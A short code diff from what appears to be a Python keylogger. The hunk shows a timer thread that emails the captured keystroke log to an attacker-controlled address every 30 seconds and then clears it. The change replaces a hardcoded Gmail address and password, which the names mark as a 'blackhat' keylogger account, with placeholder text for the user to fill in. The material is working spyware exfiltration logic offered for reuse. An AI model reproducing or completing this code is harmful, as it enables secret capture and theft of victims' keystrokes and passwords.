@@ -30,7 +30,7 @@ def send_email(mail_address,password,message):
 
 def thread_func():
     global log
-    send_email("blackhatkeylog@gmail.com", "keylogger123", log)
+    send_email("Enter Your Email", "Enter your Email Passw", log)
     log = ""
     timer_object = threading.Timer(30,thread_func)
     timer_object.start()
